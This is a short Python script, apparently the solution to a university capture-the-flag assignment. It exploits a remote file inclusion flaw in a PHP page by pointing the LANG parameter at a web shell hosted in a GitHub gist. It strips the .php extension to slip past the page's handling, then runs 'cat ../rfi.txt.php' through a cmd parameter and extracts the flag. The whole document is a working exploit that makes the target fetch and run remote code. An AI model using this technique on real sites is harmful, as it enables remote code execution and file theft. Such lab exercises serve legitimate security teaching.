from urllib.parse import urlencode
import re
import requests


def main():
    command = "cat ../rfi.txt.php"
    shell_url = 'https://gist.githubusercontent.com/ionagamed/3800490d47e2e42805c8ae7e7a3b657d/raw/346be01f579de5ab3e5d9bd3d97788b1ce5d8bce/shell.php'
    base_url = 'http://iu.ru/Assignment/case13/case13.php'

    # stripping the .php extension
    stripped_url = shell_url[:-4]

    data = requests.get(base_url + '?' + urlencode({
        'LANG': stripped_url,
        'cmd': command
    }))

    print(next(re.finditer(r'The flag is ([\w\d]*)', data.text)).group(1))


if __name__ == "__main__":
    main()
